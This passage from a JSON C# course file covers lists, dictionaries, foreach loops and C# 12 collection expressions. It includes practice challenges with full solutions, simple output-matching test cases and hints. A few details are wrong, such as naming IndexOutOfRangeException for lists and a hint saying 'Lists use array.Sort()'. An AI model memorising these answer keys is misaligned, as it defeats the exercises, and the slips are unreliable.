              "code": "using System.Collections.Generic;\n\n// Creating a list\nList<string> shoppingList = new List<string>();\n\n// Adding items\nshoppingList.Add(\"Milk\");\nshoppingList.Add(\"Bread\");\nshoppingList.Add(\"Eggs\");\n\nConsole.WriteLine(\"Items: \" + shoppingList.Count);  // 3\n\n// Accessing items (like arrays)\nConsole.WriteLine(\"First item: \" + shoppingList[0]);\n\n// Removing items\nshoppingList.Remove(\"Bread\");  // Removes \"Bread\"\nConsole.WriteLine(\"Items now: \" + shoppingList.Count);  // 2\n\n// Check if item exists\nif (shoppingList.Contains(\"Milk\"))\n{\n    Console.WriteLine(\"Don't forget milk!\");\n}\n\n// Looping through a list\nfor (int i = 0; i < shoppingList.Count; i++)\n{\n    Console.WriteLine(\"Item \" + i + \": \" + shoppingList[i]);\n}\n\n// Create list with initial values\nList<int> scores = new List<int> { 95, 87, 92, 78 };",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`List<string>`**: List<T> where T is the type. List<string> = list of strings, List<int> = list of integers. The angle brackets specify what type is stored!\n\n**`.Add(item)`**: Adds an item to the END of the list. The list automatically expands to fit! add() is THE most common list operation.\n\n**`.Remove(item)`**: Removes the FIRST occurrence of this item from the list. If the item isn't found, nothing happens (no error).\n\n**`.Count`**: Like array's .Length but for lists! Use .Count to get the number of items. NOTE: It's Count not Length!\n\n**`.Contains(item)`**: Returns true if the item exists in the list, false otherwise. Great for checking before adding or removing!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These!\n\n**Forgetting the using directive**: Lists require `using System.Collections.Generic;` at the top of your file. Without it, C# doesn't recognize the List type!\n\n**Using .Length instead of .Count**: Arrays use .Length, Lists use .Count. They're similar but NOT interchangeable - list.Length doesn't exist!\n\n**Modifying while iterating**: Removing items from a list WHILE looping through it with foreach causes a crash! Use a regular for loop (iterating backwards) or create a copy first.\n\n**Index still matters**: Even though lists resize, you can still get IndexOutOfRangeException if you access list[10] when only 5 items exist. Use .Count to check bounds!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a player inventory system!\n\n1. Create a List<string> called 'inventory'\n2. Add these items: 'Sword', 'Shield', 'Potion'\n3. Display the count of items\n4. Check if inventory Contains 'Potion' - if yes, display 'Potion ready!'\n5. Remove 'Potion' (it was used!)\n6. Add 'Gold Coin'\n7. Use a foreach loop to display all remaining items\n\nRemember: using System.Collections.Generic; at the top!",
              "starterCode": "using System.Collections.Generic;\n\n// Create inventory\n\n// Add items\n\n// Display count\n\n// Check for potion\n\n// Remove potion\n\n// Add gold coin\n\n// Display all items",
              "solution": "using System.Collections.Generic;\n\n// Create inventory\nList<string> inventory = new List<string>();\n\n// Add items\ninventory.Add(\"Sword\");\ninventory.Add(\"Shield\");\ninventory.Add(\"Potion\");\n\n// Display count\nConsole.WriteLine(\"Items in inventory: \" + inventory.Count);\n\n// Check for potion\nif (inventory.Contains(\"Potion\"))\n{\n    Console.WriteLine(\"Potion ready!\");\n}\n\n// Remove potion\ninventory.Remove(\"Potion\");\n\n// Add gold coin\ninventory.Add(\"Gold Coin\");\n\n// Display all items\nfor (int i = 0; i < inventory.Count; i++)\n{\n    Console.WriteLine(\"Item: \" + inventory[i]);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"inventory\"",
                  "expectedOutput": "inventory",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Item\"",
                  "expectedOutput": "Item",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create: List<string> list = new List<string>(); Add: list.Add(\"item\"); Remove: list.Remove(\"item\"); Check: list.Contains(\"item\")"
                },
                {
                  "level": 2,
                  "text": "Forgetting using statement: List needs 'using System.Collections.Generic;' at the top! Without it, C# doesn't know what List is."
                },
                {
                  "level": 3,
                  "text": "Using .Length instead of .Count: Arrays use .Length, Lists use .Count! list.Length doesn't exist!"
                },
                {
                  "level": 4,
                  "text": "Forgetting <T>: Just 'List' is wrong! Must specify type: List<int>, List<string>, etc. The angle brackets are REQUIRED!"
                },
                {
                  "level": 5,
                  "text": "Index out of range on dynamic lists: If you remove items, the Count changes! Always loop with i < list.Count, not a hardcoded number."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting using statement",
                  "consequence": "List needs 'using System.Collections.Generic;' at the top! Without it, C# doesn't know what List is.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using .Length instead of .Count",
                  "consequence": "Arrays use .Length, Lists use .Count! list.Length doesn't exist!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting <T>",
                  "consequence": "Just 'List' is wrong! Must specify type: List<int>, List<string>, etc. The angle brackets are REQUIRED!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Index out of range on dynamic lists",
                  "consequence": "If you remove items, the Count changes! Always loop with i < list.Count, not a hardcoded number.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-05-03",
          "title": "Dictionary<TKey, TValue> (The Lookup Table)",
          "moduleId": "module-05",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a real dictionary: You look up a WORD (the key) and get its DEFINITION (the value). You don't flip through page by page - you jump straight to the word!\n\nA Dictionary<TKey, TValue> works the same way! It stores KEY-VALUE PAIRS:\n• The KEY is unique (like a word - only appears once)\n• The VALUE is what you get when you look up that key\n• Lookup is INSTANT - no matter how big the dictionary!\n\nExamples:\n• Phone book: Name (key) → Phone number (value)\n• Game: PlayerName (key) → Score (value)\n• Store: ProductID (key) → Price (value)\n\nWhy not use a List? Lists require you to search through items one by one. Dictionaries use the key for INSTANT lookup - like using an index in a book!\n\nPerfect for when you need to find things by a unique identifier!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System.Collections.Generic;\n\n// Creating a dictionary\nDictionary<string, int> playerScores = new Dictionary<string, int>();\n\n// Adding key-value pairs\nplayerScores.Add(\"Alice\", 1500);\nplayerScores.Add(\"Bob\", 1200);\nplayerScores.Add(\"Charlie\", 1800);\n\n// Or initialize with values\nDictionary<string, string> capitals = new Dictionary<string, string>\n{\n    { \"USA\", \"Washington DC\" },\n    { \"France\", \"Paris\" },\n    { \"Japan\", \"Tokyo\" }\n};\n\n// Accessing values by key\nConsole.WriteLine(\"Alice's score: \" + playerScores[\"Alice\"]);\nConsole.WriteLine(\"France's capital: \" + capitals[\"France\"]);\n\n// Checking if key exists\nif (playerScores.ContainsKey(\"Bob\"))\n{\n    Console.WriteLine(\"Bob's score: \" + playerScores[\"Bob\"]);\n}\n\n// Updating a value\nplayerScores[\"Alice\"] = 1600;  // Alice scored more!\n\n// Looping through dictionary\nforeach (var pair in playerScores)\n{\n    Console.WriteLine(pair.Key + \" has \" + pair.Value + \" points\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Dictionary<TKey, TValue>`**: Two types in angle brackets: TKey (key type) and TValue (value type). Dictionary<string, int> means string keys, int values.\n\n**`.Add(key, value)`**: Adds a key-value pair. The key MUST be unique! Trying to add the same key twice causes an error.\n\n**`dict[key]`**: Get or set a value by its key. dict['Alice'] gets Alice's value. dict['Alice'] = 100 sets it. If key doesn't exist, CRASH!\n\n**`.ContainsKey(key)`**: Check if a key exists BEFORE accessing it! Always check first to avoid crashes: if (dict.ContainsKey('x')) { use dict['x'] }\n\n**`foreach (var pair in dict)`**: Loop through key-value pairs. Each 'pair' has .Key and .Value properties. Order is NOT guaranteed!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These!\n\n**KeyNotFoundException**: Accessing dict[\"key\"] when \"key\" doesn't exist throws an exception! ALWAYS use ContainsKey() first, or use TryGetValue() for safer access.\n\n**Duplicate key exception**: Calling .Add() with a key that already exists crashes! Use dict[key] = value instead if you want to update OR add.\n\n**Keys are case-sensitive (for strings)**: \"Alice\" and \"alice\" are DIFFERENT keys! If you need case-insensitive matching, use StringComparer.OrdinalIgnoreCase when creating the dictionary.\n\n**No guaranteed order**: Don't rely on items being in any particular order when looping. If you need order, consider SortedDictionary or sort the keys yourself.\n\n**Null keys**: String keys cannot be null - attempting to use null as a key throws ArgumentNullException!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple English-Spanish translator!\n\n1. Create Dictionary<string, string> called 'translator'\n2. Add translations: 'hello' → 'hola', 'goodbye' → 'adiós', 'friend' → 'amigo'\n3. Look up and display the translation for 'hello'\n4. Check if 'goodbye' exists, then display its translation\n5. Add a new translation: 'water' → 'agua'\n6. Use foreach to display all translations in format: 'English: Spanish'",
              "starterCode": "using System.Collections.Generic;\n\n// Create translator dictionary\n\n// Add translations\n\n// Look up 'hello'\n\n// Check and display 'goodbye'\n\n// Add 'water'\n\n// Display all translations",
              "solution": "using System.Collections.Generic;\n\n// Create translator dictionary\nDictionary<string, string> translator = new Dictionary<string, string>();\n\n// Add translations\ntranslator.Add(\"hello\", \"hola\");\ntranslator.Add(\"goodbye\", \"adiós\");\ntranslator.Add(\"friend\", \"amigo\");\n\n// Look up 'hello'\nConsole.WriteLine(\"hello: \" + translator[\"hello\"]);\n\n// Check and display 'goodbye'\nif (translator.ContainsKey(\"goodbye\"))\n{\n    Console.WriteLine(\"goodbye: \" + translator[\"goodbye\"]);\n}\n\n// Add 'water'\ntranslator.Add(\"water\", \"agua\");\n\n// Display all translations\nforeach (var pair in translator)\n{\n    Console.WriteLine(pair.Key + \": \" + pair.Value);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"hello\"",
                  "expectedOutput": "hello",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"hola\"",
                  "expectedOutput": "hola",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create: Dictionary<string, string> dict = new Dictionary<string, string>(); Add: dict.Add(key, value); Access: dict[key]; Check: ContainsKey(key)"
                },
                {
                  "level": 2,
                  "text": "Duplicate keys: Adding the same key twice throws an error! Use ContainsKey to check first, or use dict[key] = value which updates if exists."
                },
                {
                  "level": 3,
                  "text": "Accessing non-existent key: dict['xyz'] when 'xyz' doesn't exist = CRASH! Always use ContainsKey first!"
                },
                {
                  "level": 4,
                  "text": "Wrong foreach syntax: foreach (string x in dict) is wrong! Use foreach (var pair in dict) then access pair.Key and pair.Value."
                },
                {
                  "level": 5,
                  "text": "Forgetting two types: Dictionary<string> is WRONG! Need TWO types: Dictionary<TKey, TValue> like Dictionary<string, int>."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Duplicate keys",
                  "consequence": "Adding the same key twice throws an error! Use ContainsKey to check first, or use dict[key] = value which updates if exists.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Accessing non-existent key",
                  "consequence": "dict['xyz'] when 'xyz' doesn't exist = CRASH! Always use ContainsKey first!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong foreach syntax",
                  "consequence": "foreach (string x in dict) is wrong! Use foreach (var pair in dict) then access pair.Key and pair.Value.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting two types",
                  "consequence": "Dictionary<string> is WRONG! Need TWO types: Dictionary<TKey, TValue> like Dictionary<string, int>.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-05-04",
          "title": "Iterating Collections (foreach Loop)",
          "moduleId": "module-05",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned to CREATE collections (arrays, lists, dictionaries). Now learn to WORK with them efficiently!\n\nThe FOREACH loop is your best friend for collections:\n\n❌ OLD WAY (with for loop):\nfor (int i = 0; i < names.Length; i++)\n{\n    Console.WriteLine(names[i]);\n}\n\n✅ NEW WAY (with foreach):\nforeach (string name in names)\n{\n    Console.WriteLine(name);\n}\n\nForeach is:\n✅ Simpler - no index variable needed\n✅ Safer - can't go out of bounds\n✅ Cleaner - less code to write\n✅ Works with ALL collections (arrays, lists, dictionaries)\n\nThink: foreach = \"for each item in this collection, do something\""
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\n\n// FOREACH WITH ARRAYS\nstring[] fruits = { \"Apple\", \"Banana\", \"Orange\", \"Grape\" };\n\nConsole.WriteLine(\"=== Fruits ===\");\nforeach (string fruit in fruits)\n{\n    Console.WriteLine($\"I like {fruit}!\");\n}\n\n// FOREACH WITH LISTS\nList<int> scores = new List<int> { 95, 87, 92, 78, 88 };\n\nConsole.WriteLine(\"\\n=== Scores ===\");\nforeach (int score in scores)\n{\n    Console.WriteLine($\"Score: {score}\");\n}\n\n// CALCULATING WITH FOREACH\nint total = 0;\nforeach (int score in scores)\n{\n    total += score;\n}\ndouble average = (double)total / scores.Count;\nConsole.WriteLine($\"\\nTotal: {total}, Average: {average:F2}\");\n\n// FINDING WITH FOREACH\nint searchFor = 92;\nbool found = false;\n\nforeach (int score in scores)\n{\n    if (score == searchFor)\n    {\n        Console.WriteLine($\"\\nFound {searchFor}!\");\n        found = true;\n        break;\n    }\n}\n\nif (!found)\n{\n    Console.WriteLine($\"\\n{searchFor} not found\");\n}\n\n// COUNTING WITH FOREACH\nint passingCount = 0;\nforeach (int score in scores)\n{\n    if (score >= 60)\n    {\n        passingCount++;\n    }\n}\nConsole.WriteLine($\"\\nPassing scores: {passingCount}\");\n\n// USEFUL COLLECTION METHODS\nList<string> shoppingCart = new List<string>();\n\n// .Add - add items\nshoppingCart.Add(\"Milk\");\nshoppingCart.Add(\"Bread\");\nshoppingCart.Add(\"Eggs\");\nConsole.WriteLine($\"\\nCart has {shoppingCart.Count} items\");\n\n// .Contains - check if item exists\nif (shoppingCart.Contains(\"Milk\"))\n{\n    Console.WriteLine(\"Milk is in the cart\");\n}\n\n// .Remove - remove item\nshoppingCart.Remove(\"Bread\");\nConsole.WriteLine($\"After removing bread: {shoppingCart.Count} items\");\n\n// .Clear - remove all\nshoppingCart.Clear();\nConsole.WriteLine($\"After clearing: {shoppingCart.Count} items\");\n\n// SORTING (Arrays)\nint[] numbers = { 5, 2, 8, 1, 9 };\nArray.Sort(numbers);  // Sorts in place: 1, 2, 5, 8, 9\n\nConsole.WriteLine(\"\\n=== Sorted Numbers ===\");\nforeach (int num in numbers)\n{\n    Console.Write(num + \" \");\n}\n\n// SORTING (Lists)\nList<string> names = new List<string> { \"Charlie\", \"Alice\", \"Bob\" };\nnames.Sort();  // Alphabetical\n\nConsole.WriteLine(\"\\n\\n=== Sorted Names ===\");\nforeach (string name in names)\n{\n    Console.WriteLine(name);\n}\n\n// REVERSING\nnames.Reverse();  // Reverse order\nConsole.WriteLine(\"\\n=== Reversed ===\");\nforeach (string name in names)\n{\n    Console.WriteLine(name);\n}\n\n// PRACTICAL: Finding min/max manually\nint[] ages = { 25, 30, 18, 45, 22, 35 };\nint oldest = ages[0];\nint youngest = ages[0];\n\nforeach (int age in ages)\n{\n    if (age > oldest)\n        oldest = age;\n    if (age < youngest)\n        youngest = age;\n}\n\nConsole.WriteLine($\"\\nOldest: {oldest}, Youngest: {youngest}\");\n\n// FOREACH WITH DICTIONARIES\nDictionary<string, int> inventory = new Dictionary<string, int>\n{\n    { \"Apples\", 50 },\n    { \"Oranges\", 30 },\n    { \"Bananas\", 25 }\n};\n\nConsole.WriteLine(\"\\n=== Inventory ===\");\nforeach (KeyValuePair<string, int> item in inventory)\n{\n    Console.WriteLine($\"{item.Key}: {item.Value} units\");\n}\n\n// Can also use var\nforeach (var item in inventory)\n{\n    if (item.Value < 40)\n    {\n        Console.WriteLine($\"Low stock: {item.Key}\");\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`foreach (type item in collection)`**: Iterates through each element. 'type' matches collection type (int for int[], string for string[]). 'item' is current element. 'collection' is what to iterate.\n\n**`.Count vs .Length`**: Lists use .Count property. Arrays use .Length property. Both tell you number of elements. No parentheses - they're properties not methods!\n\n**`.Add(item)`**: Adds item to end of List. list.Add(5) appends 5. Can't use with arrays - they're fixed size!\n\n**`.Contains(item)`**: Returns true if item exists in collection, false otherwise. Works with Lists, arrays (using Array methods), dictionaries. list.Contains(\"Bob\") checks if \"Bob\" is in list.\n\n**`Array.Sort() / list.Sort()`**: Sorts collection in place. Array.Sort(array) for arrays. list.Sort() for lists. Ascending order (smallest to largest, A to Z)."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These!\n\n**Cannot modify collection during foreach**: Adding or removing items while iterating with foreach throws InvalidOperationException! If you need to modify, use a regular for loop or create a copy of the collection first.\n\n**foreach is read-only**: You cannot change the loop variable inside foreach. `foreach (var x in list) { x = 5; }` won't actually modify the list - the variable is a copy!\n\n**No index access in foreach**: If you need the position/index of each item, use a regular for loop or use LINQ's Select with index. foreach only gives you values, not positions.\n\n**break and continue still work**: Use `break` to exit the loop early, `continue` to skip to the next iteration. These work the same as in for loops.\n\n**Empty collections are safe**: Iterating over an empty collection with foreach simply does nothing - no crash, no error. It's safe to use!"
            },
            {
              "type": "ARCHITECTURE",
              "title": "Choosing the Right Collection",
              "content": "## Collection Decision Guide for ShopFlow\n\nNow that you know how to iterate collections with foreach, let's discuss how to choose the right collection for your needs.\n\nSelecting the appropriate collection type is a critical architectural decision that impacts performance, memory usage, and code clarity. In our ShopFlow e-commerce platform, different scenarios call for different collection types. Here is a comprehensive decision table to guide your choices:\n\n| Scenario | Collection | Why |\n|----------|------------|-----|\n| Product catalog by SKU | `Dictionary<string, Product>` | O(1) lookup by unique product identifier enables instant product retrieval |\n| Shopping cart items | `List<CartItem>` | Ordered collection that allows duplicates and easy iteration for display |\n| Unique category tags | `HashSet<string>` | Automatic deduplication ensures no duplicate tags, fast membership testing |\n| Order processing queue | `Queue<Order>` | FIFO (First-In-First-Out) ensures orders are processed in submission order |\n| Undo/redo cart operations | `Stack<CartAction>` | LIFO (Last-In-First-Out) naturally supports undo operations |\n| Sorted price ranges | `SortedSet<decimal>` | Maintains automatic ascending order for price tier displays |\n\n```csharp\n// Example: Choosing the right collection for ShopFlow\nvar productCatalog = new Dictionary<string, Product>();\nvar cartItems = new List<CartItem>();\nvar uniqueTags = new HashSet<string>();\nvar orderQueue = new Queue<Order>();\n```\n\n### **Advanced:** Immutable Collections (System.Collections.Immutable)\n\nFor thread-safe, read-only data that should never change after creation, use immutable collections. In ShopFlow, these are ideal for static configuration data like shipping regions or tax rates. The `ImmutableList<T>`, `ImmutableDictionary<TKey, TValue>`, and `ImmutableHashSet<T>` types create new instances for any modification, ensuring the original remains unchanged. This is particularly valuable for caching product catalogs that multiple threads read simultaneously without locking concerns.\n\n### **Advanced:** Concurrent Collections (System.Collections.Concurrent)\n\nWhen multiple threads need to modify collections simultaneously, concurrent collections provide thread-safe operations without explicit locking. The `ConcurrentDictionary<TKey, TValue>` is perfect for ShopFlow's real-time inventory tracking where multiple order processors update stock counts. `ConcurrentQueue<T>` handles the order processing pipeline where web requests enqueue orders while background workers dequeue them. `ConcurrentBag<T>` works well for collecting analytics events from multiple sources.\n\n### ShopFlow-Specific Patterns\n\nIn ShopFlow, the product service uses `Dictionary<string, Product>` for the main catalog, enabling instant SKU lookups during checkout. The search feature uses `HashSet<string>` to collect unique matching product IDs before fetching full details. The checkout flow uses `Queue<ValidationStep>` to process validation rules in sequence. Customer wishlists use `List<Product>` since order matters and customers may want to see items in the order they were added.\n\n### Performance Considerations\n\nChoose `Dictionary` when you need fast key-based access (O(1) average). Choose `List` when you need indexed access and ordering. Choose `HashSet` when you only care about membership testing and uniqueness. Choose `SortedSet` or `SortedDictionary` when you need automatic sorting but can accept O(log n) operations. Always profile your specific use case, as the best theoretical choice may not always be the best practical choice for your data size and access patterns."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a grade book manager!\n\n1. Create a List<string> for student names\n2. Create a List<int> for their grades\n3. Add 5 students with their grades (use .Add)\n4. Display all students with their grades using foreach\n5. Calculate:\n   - Total of all grades\n   - Average grade\n   - Highest grade (find manually with foreach)\n   - Lowest grade (find manually with foreach)\n6. Count how many students passed (grade >= 60)\n7. Sort grades and display sorted list\n8. Check if a specific grade exists using .Contains\n\nExample output:\n=== GRADE BOOK ===\nAlice: 85\nBob: 72\nCharlie: 91\nDiana: 68\nEve: 95\n\nTotal: 411\nAverage: 82.2\nHighest: 95\nLowest: 68\nPassed: 5/5\n\nSorted grades: 68, 72, 85, 91, 95\nContains 90? False",
              "starterCode": "// Grade Book Manager\n\nusing System;\nusing System.Collections.Generic;\n\nList<string> names = new List<string>();\nList<int> grades = new List<int>();\n\n// Add 5 students\nnames.Add(\"Alice\");\ngrades.Add(85);\n// Add 4 more...\n\n// Display all students\nConsole.WriteLine(\"=== GRADE BOOK ===\");\nfor (int i = 0; i < names.Count; i++)\n{\n    Console.WriteLine($\"{names[i]}: {grades[i]}\");\n}\n\n// Calculate statistics using foreach\n\n// Sort and display",
              "solution": "// Grade Book Manager\n\nusing System;\nusing System.Collections.Generic;\n\nList<string> names = new List<string>();\nList<int> grades = new List<int>();\n\n// Add 5 students\nnames.Add(\"Alice\");\ngrades.Add(85);\nnames.Add(\"Bob\");\ngrades.Add(72);\nnames.Add(\"Charlie\");\ngrades.Add(91);\nnames.Add(\"Diana\");\ngrades.Add(68);\nnames.Add(\"Eve\");\ngrades.Add(95);\n\n// Display all students\nConsole.WriteLine(\"=== GRADE BOOK ===\");\nfor (int i = 0; i < names.Count; i++)\n{\n    Console.WriteLine($\"{names[i]}: {grades[i]}\");\n}\n\n// Calculate total and average\nint total = 0;\nforeach (int grade in grades)\n{\n    total += grade;\n}\ndouble average = (double)total / grades.Count;\n\n// Find highest and lowest\nint highest = grades[0];\nint lowest = grades[0];\nforeach (int grade in grades)\n{\n    if (grade > highest)\n        highest = grade;\n    if (grade < lowest)\n        lowest = grade;\n}\n\n// Count passing\nint passedCount = 0;\nforeach (int grade in grades)\n{\n    if (grade >= 60)\n        passedCount++;\n}\n\nConsole.WriteLine($\"\\nTotal: {total}\");\nConsole.WriteLine($\"Average: {average:F1}\");\nConsole.WriteLine($\"Highest: {highest}\");\nConsole.WriteLine($\"Lowest: {lowest}\");\nConsole.WriteLine($\"Passed: {passedCount}/{grades.Count}\");\n\n// Sort and display\nList<int> sortedGrades = new List<int>(grades);  // Copy first\nsortedGrades.Sort();\n\nConsole.Write(\"\\nSorted grades: \");\nforeach (int grade in sortedGrades)\n{\n    Console.Write(grade + \" \");\n}\n\n// Check contains\nConsole.WriteLine($\"\\n\\nContains 90? {grades.Contains(90)}\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"GRADE BOOK\"",
                  "expectedOutput": "GRADE BOOK",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Total\"",
                  "expectedOutput": "Total",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Average\"",
                  "expectedOutput": "Average",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Highest\"",
                  "expectedOutput": "Highest",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"Lowest\"",
                  "expectedOutput": "Lowest",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use foreach to iterate and calculate. Track highest/lowest with if statements. Use .Sort() to sort list. Use .Contains() to check if value exists. Cast to double for average: (double)total / count."
                },
                {
                  "level": 2,
                  "text": "Modifying during foreach: Can't add/remove items while foreaching! foreach (var x in list) { list.Remove(x); } crashes! Use regular for loop to modify."
                },
                {
                  "level": 3,
                  "text": "No index in foreach: foreach doesn't give you position. If you need index, use for loop: for (int i = 0; i < list.Count; i++)."
                },
                {
                  "level": 4,
                  "text": "Count vs Length: Lists use .Count (no parentheses!). Arrays use .Length (no parentheses!). Both are properties, not methods."
                },
                {
                  "level": 5,
                  "text": "Array.Sort vs list.Sort: Arrays need Array.Sort(array). Lists use array.Sort(). Different syntax for same operation!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Modifying during foreach",
                  "consequence": "Can't add/remove items while foreaching! foreach (var x in list) { list.Remove(x); } crashes! Use regular for loop to modify.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "No index in foreach",
                  "consequence": "foreach doesn't give you position. If you need index, use for loop: for (int i = 0; i < list.Count; i++).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Count vs Length",
                  "consequence": "Lists use .Count (no parentheses!). Arrays use .Length (no parentheses!). Both are properties, not methods.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Array.Sort vs list.Sort",
                  "consequence": "Arrays need Array.Sort(array). Lists use array.Sort(). Different syntax for same operation!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-05-05",
          "title": "Collection Expressions (C# 12)",
          "moduleId": "module-05",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Remember how creating collections used to be confusing? Arrays use { }, Lists need new List<T>(), and each has different syntax. It's like every store having different payment systems!\n\nC# 12 introduces COLLECTION EXPRESSIONS - one universal syntax for ALL collections! Think of it like a universal remote that works with any TV.\n\nBefore: Different syntax everywhere!\n- int[] arr = new int[] { 1, 2, 3 };\n- List<int> list = new List<int> { 1, 2, 3 };\n- Span<int> span = stackalloc int[] { 1, 2, 3 };\n\nAfter: One syntax to rule them all!\n- int[] arr = [1, 2, 3];\n- List<int> list = [1, 2, 3];\n- Span<int> span = [1, 2, 3];\n\nThe square brackets [ ] work for arrays, lists, spans, and more! Plus you get the SPREAD operator (..) to combine collections!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// OLD WAY - verbose and inconsistent\nint[] oldArray = new int[] { 1, 2, 3, 4, 5 };\nList<int> oldList = new List<int> { 1, 2, 3, 4, 5 };\n\n// NEW WAY - Collection Expressions (C# 12)!\nint[] numbers = [1, 2, 3, 4, 5];\nList<int> scores = [95, 87, 92, 78, 88];\nstring[] names = [\"Alice\", \"Bob\", \"Charlie\"];\n\n// Empty collections\nint[] empty = [];\nList<string> emptyList = [];\n\n// SPREAD OPERATOR - combine collections!\nint[] first = [1, 2, 3];\nint[] second = [4, 5, 6];\nint[] combined = [..first, ..second];  // [1, 2, 3, 4, 5, 6]\n\n// Mix values and spreads\nint[] withExtra = [0, ..first, 4, 5];  // [0, 1, 2, 3, 4, 5]\n\n// Works with method calls too!\nvoid PrintNumbers(int[] nums)\n{\n    foreach (var n in nums)\n        Console.WriteLine(n);\n}\n\nPrintNumbers([10, 20, 30]);  // Pass inline!\n\n// Great for building collections conditionally\nint bonus = 100;\nList<int> allScores = [..scores, bonus];  // Add bonus to end\nConsole.WriteLine(string.Join(\", \", allScores));\n\n// Works with Span<T> for high-performance code\nSpan<int> span = [1, 2, 3, 4, 5];\nReadOnlySpan<char> chars = ['H', 'e', 'l', 'l', 'o'];",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`[1, 2, 3]`**: Square brackets with comma-separated values create a collection. The target type (int[], List<int>, etc.) determines what's created!\n\n**`[]`**: Empty brackets create an empty collection. Much cleaner than new List<int>() or Array.Empty<int>()!\n\n**`[..existing, newValue]`**: The SPREAD element '..' expands a collection inline. Perfect for combining collections or adding elements. Note: '..' is not an operator - it's part of the spread element syntax!\n\n**`Target-typed`**: C# looks at what you're assigning to and creates the right type. 'int[] x = [1,2,3]' creates array, 'List<int> x = [1,2,3]' creates List!\n\n**`Inline passing`**: You can pass collections directly to methods: DoSomething([1, 2, 3]) - no need to declare a variable first!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
